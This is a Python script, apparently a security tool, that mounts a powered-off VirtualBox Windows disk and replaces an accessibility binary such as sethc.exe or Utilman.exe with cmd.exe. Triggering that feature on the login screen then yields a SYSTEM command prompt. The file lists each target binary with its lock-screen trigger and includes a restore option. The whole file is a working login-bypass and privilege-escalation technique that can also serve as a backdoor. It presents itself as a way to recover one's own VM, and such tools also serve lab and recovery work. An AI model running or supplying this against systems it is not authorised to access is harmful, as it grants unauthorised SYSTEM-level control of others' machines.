#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : Accessibility-swap-login-LPE.py
# Author             : Podalirius (@podalirius_)
# Date created       : 1 Jul 2025

"""
Replace a Windows accessibility binary (Magnify.exe, sethc.exe, Utilman.exe, ...)
with cmd.exe inside a VirtualBox .vdi disk, so triggering that accessibility
feature on the login screen spawns a SYSTEM command prompt.

This is the offline variant of the "Accessibility Features" login-screen
privilege escalation (MITRE ATT&CK T1546.008): the accessibility tools launched
from the lock screen run as NT AUTHORITY\\SYSTEM, so swapping one for cmd.exe
yields a SYSTEM shell before any user logs in.

Intended for recovering access to *your own* virtual machine.

How it works:
  * qemu-nbd exposes the .vdi as a block device (/dev/nbdN). This is the only
    reliable way to read AND write VirtualBox's VDI block format from Linux.
  * The Windows partition (the one holding /Windows/System32/cmd.exe) is
    mounted with ntfs-3g.
  * The chosen accessibility binary is backed up (once) to <name>.exe.bak and
    overwritten with a copy of cmd.exe.

Reverse it later with:  sudo ./Accessibility-swap-login-LPE.py disk.vdi --restore

Requirements (Linux):  qemu-utils (qemu-nbd), ntfs-3g, root privileges, and the
VM must be POWERED OFF (do not run against a disk in use).
"""

import argparse
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path

# The System32 directory *within* the mounted Windows partition.
SYSTEM32_REL = Path("Windows/System32")
CMD_REL = SYSTEM32_REL / "cmd.exe"
BACKUP_SUFFIX = ".bak"

# Accessibility binaries launched from the login screen by winlogon.exe in the
# SYSTEM context (MITRE ATT&CK T1546.008). Each entry maps a short CLI key to
# the System32 executable name and how the operator triggers it on the lock
# screen once it has been swapped for cmd.exe.
ACCESSIBILITY_BINARIES = {
    "sethc":         ("sethc.exe",         "press Shift five times (Sticky Keys)"),
    "utilman":       ("Utilman.exe",       "press Win+U, or click the Ease of Access button (Utility Manager)"),
    "magnify":       ("Magnify.exe",       "Ease of Access -> Magnifier"),
    "osk":           ("osk.exe",           "Ease of Access -> On-Screen Keyboard"),
    "narrator":      ("Narrator.exe",      "press Win+Ctrl+Enter (Narrator)"),
    "displayswitch": ("DisplaySwitch.exe", "press Win+P (Display Switch)"),
    "atbroker":      ("AtBroker.exe",      "Assistive Technology broker"),
}
DEFAULT_BINARY = "magnify"


def die(msg: str) -> None:
    """Print an error message to stderr and exit with a non-zero status."""
    print(f"[!] {msg}", file=sys.stderr)
    sys.exit(1)


def run(cmd: list[str], **kwargs) -> subprocess.CompletedProcess:
    """Run a command, raising CalledProcessError on failure and capturing output."""
    return subprocess.run(cmd, check=True, capture_output=True, text=True, **kwargs)


def require_root() -> None:
    """Abort unless the script is running as root (needed for NBD and mounting)."""
    if os.geteuid() != 0:
        die("Must run as root (sudo). NBD attach and mounting require it.")


def require_tools() -> None:
    """Abort if any of the external tools this script depends on is missing."""
    for tool in ("qemu-nbd", "ntfs-3g", "ntfsfix", "lsblk"):
        if shutil.which(tool) is None:
            die(f"Required tool not found: {tool}. "
                f"Install with e.g. 'sudo apt install qemu-utils ntfs-3g'.")


def ensure_nbd_module() -> None:
    """Load the nbd kernel module (with partition support) if it is not present."""
    if not Path("/sys/module/nbd").exists():
        try:
            run(["modprobe", "nbd", "max_part=16"])
        except subprocess.CalledProcessError as e:
            die(f"Failed to load nbd kernel module: {e.stderr.strip()}")


def find_free_nbd() -> str:
    """Return the path of an NBD device that has no backing store attached."""
    for i in range(16):
        dev = Path(f"/dev/nbd{i}")
        if not dev.exists():
            continue
        # size == 0 means nothing is connected to this nbd device.
        size_file = Path(f"/sys/block/nbd{i}/size")
        try:
            if size_file.read_text().strip() == "0":
                return str(dev)
        except OSError:
            continue
    die("No free /dev/nbdN device available.")


def connect_vdi(vdi: Path) -> str:
    """Attach the .vdi file to a free NBD device and return that device path."""
    dev = find_free_nbd()
    try:
        run(["qemu-nbd", "--connect", dev, "--format", "vdi", str(vdi)])
    except subprocess.CalledProcessError as e:
        die(f"qemu-nbd failed to attach {vdi}: {e.stderr.strip()}")
    # Give the kernel a moment to enumerate partitions.
    time.sleep(1)
    if shutil.which("partprobe"):
        run(["partprobe", dev])
    time.sleep(1)
    return dev


def disconnect_vdi(dev: str) -> None:
    """Detach the .vdi file from its NBD device (best effort)."""
    try:
        run(["qemu-nbd", "--disconnect", dev])
    except subprocess.CalledProcessError as e:
        print(f"[!] Warning: failed to disconnect {dev}: {e.stderr.strip()}",
              file=sys.stderr)


def list_partitions(dev: str) -> list[str]:
    """Return candidate partition device paths for the attached disk."""
    base = os.path.basename(dev)
    parts = []
    for entry in sorted(Path("/sys/block", base).glob(f"{base}p*")):
        parts.append(f"/dev/{entry.name}")
    # Some disks have no partition table (whole-device filesystem).
    return parts or [dev]


def mount_partition(part: str, mountpoint: Path) -> bool:
    """Mount an NTFS partition read-write; return True on success, False otherwise."""
    mountpoint.mkdir(parents=True, exist_ok=True)
    try:
        # remove_hiberfile lets ntfs-3g mount rw even if a hiberfile exists
        # (Windows fast-startup / hibernation leaves the volume "unclean").
        run(["mount", "-t", "ntfs-3g", "-o", "rw,remove_hiberfile",
             part, str(mountpoint)])
        return True
    except subprocess.CalledProcessError:
        return False


def umount(mountpoint: Path) -> None:
    """Unmount a mountpoint, falling back to a lazy unmount if the first fails."""
    try:
        run(["umount", str(mountpoint)])
    except subprocess.CalledProcessError:
        # Retry lazily as a fallback.
        subprocess.run(["umount", "-l", str(mountpoint)], capture_output=True)


def is_readonly(mountpoint: Path) -> bool:
    """Return True if the mountpoint is currently mounted read-only."""
    target = os.path.realpath(mountpoint)
    with open("/proc/mounts") as fh:
        for line in fh:
            fields = line.split()
            if len(fields) >= 4 and os.path.realpath(fields[1]) == target:
                opts = fields[3].split(",")
                return "ro" in opts
    return False


def ensure_writable(part: str, mountpoint: Path) -> None:
    """If the volume mounted read-only (dirty NTFS), clear it and remount rw."""
    if not is_readonly(mountpoint):
        return
    print("[!] Partition mounted read-only (dirty NTFS / hibernation). "
          "Clearing with ntfsfix...")
    umount(mountpoint)
    try:
        run(["ntfsfix", "-d", part])  # -d clears the volume-dirty flag
    except subprocess.CalledProcessError as e:
        die(f"ntfsfix failed on {part}: {e.stderr.strip()}")
    if not mount_partition(part, mountpoint):
        die(f"Re-mount of {part} failed after ntfsfix.")
    if is_readonly(mountpoint):
        die(f"{part} is still read-only after ntfsfix. The volume may be "
            f"hibernated; boot the VM and shut it down cleanly, then retry.")
    print("[+] Partition is now writable.")


def find_windows_partition(dev: str, mountpoint: Path) -> str | None:
    """Mount each partition until one contains Windows/System32/cmd.exe."""
    for part in list_partitions(dev):
        if not mount_partition(part, mountpoint):
            continue
        if (mountpoint / CMD_REL).exists():
            print(f"[+] Windows install found on {part}")
            return part
        umount(mountpoint)
    return None


def do_swap(root: Path, exe_name: str, trigger: str) -> None:
    """Back up the accessibility binary (once) and overwrite it with cmd.exe."""
    target = root / SYSTEM32_REL / exe_name
    cmd = root / CMD_REL
    backup = target.with_name(target.name + BACKUP_SUFFIX)

    if not cmd.exists():
        die(f"cmd.exe not found at {cmd} — is this a Windows system partition?")

    if backup.exists():
        print(f"[=] Backup already exists ({backup.name}); not overwriting it. "
              f"Re-applying swap.")
    else:
        if not target.exists():
            die(f"{exe_name} not found at {target}; nothing to back up.")
        shutil.copy2(target, backup)
        print(f"[+] Backed up original {exe_name} -> {backup.name}")

    # Overwrite the accessibility binary with cmd.exe.
    tmp = target.with_name(target.name + ".new")
    shutil.copy2(cmd, tmp)
    os.replace(tmp, target)
    print(f"[+] Replaced {SYSTEM32_REL / exe_name} with cmd.exe")
    print("[+] Done. Boot the VM and, on the login screen, "
          f"{trigger} to get a SYSTEM command prompt.")


def do_restore(root: Path, exe_name: str) -> None:
    """Restore the original accessibility binary from its backup, then delete it."""
    target = root / SYSTEM32_REL / exe_name
    backup = target.with_name(target.name + BACKUP_SUFFIX)
    if not backup.exists():
        die(f"No backup found at {backup}; cannot restore.")
    tmp = target.with_name(target.name + ".new")
    shutil.copy2(backup, tmp)
    os.replace(tmp, target)
    backup.unlink()
    print(f"[+] Restored original {exe_name} and removed {backup.name}")


def parseArgs() -> argparse.Namespace:
    """Parse and return the command line arguments."""
    targets_help = "available accessibility targets (--target):\n" + "\n".join(
        f"  {key:<14} {exe:<18} {trigger}"
        for key, (exe, trigger) in ACCESSIBILITY_BINARIES.items()
    )
    parser = argparse.ArgumentParser(
        description=__doc__,
        epilog=targets_help,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("vdi", type=Path, help="Path to the .vdi disk file")
    parser.add_argument("-t", "--target", choices=sorted(ACCESSIBILITY_BINARIES),
                        default=DEFAULT_BINARY, metavar="TARGET",
                        help="Accessibility binary to swap with cmd.exe: "
                             f"{', '.join(sorted(ACCESSIBILITY_BINARIES))} "
                             f"(default: {DEFAULT_BINARY})")
    parser.add_argument("--restore", action="store_true",
                        help="Restore the original accessibility binary from backup")
    return parser.parse_args()


def main() -> None:
    """Attach the VDI, locate the Windows partition, and swap or restore the target."""
    options = parseArgs()
    exe_name, trigger = ACCESSIBILITY_BINARIES[options.target]

    require_root()
    require_tools()

    vdi = options.vdi.resolve()
    if not vdi.is_file():
        die(f"VDI file not found: {vdi}")

    ensure_nbd_module()

    mountpoint = Path("/mnt/vdi_accessibility_swap")
    dev = connect_vdi(vdi)
    win_part = None
    try:
        win_part = find_windows_partition(dev, mountpoint)
        if not win_part:
            die("Could not locate a Windows partition containing System32. "
                "Is this the right disk, and is the VM powered off?")
        ensure_writable(win_part, mountpoint)
        if options.restore:
            do_restore(mountpoint, exe_name)
        else:
            do_swap(mountpoint, exe_name, trigger)
    finally:
        if win_part:
            umount(mountpoint)
            try:
                mountpoint.rmdir()
            except OSError:
                pass
        disconnect_vdi(dev)


if __name__ == "__main__":
    main()
